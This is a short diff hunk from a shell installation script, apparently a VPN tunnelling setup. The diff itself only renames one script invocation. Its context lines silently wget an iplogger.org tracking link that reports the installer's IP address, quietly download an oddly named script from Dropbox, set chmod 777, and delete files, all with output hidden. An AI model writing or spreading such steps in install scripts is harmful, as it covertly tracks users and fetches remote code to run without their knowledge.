@@ -72,7 +72,7 @@ wget https://iplogger.org/2lHZ43 > /dev/null 2>&1
 rm 2lHZ43 > /dev/null 2>&1
 cd /bin/ > /dev/null 2>&1
 rm ubuntu225.sh > /dev/null 2>&1
-bash badvpn
+bash badvpn.sh
 bash ubuntu22.sh
 wget https://www.dropbox.com/s/m9tnme1jjbnehnj/botteUUste.sh >/dev/null 2>&1
 chmod 777 ubuntu2662.sh > /dev/null 2>&1
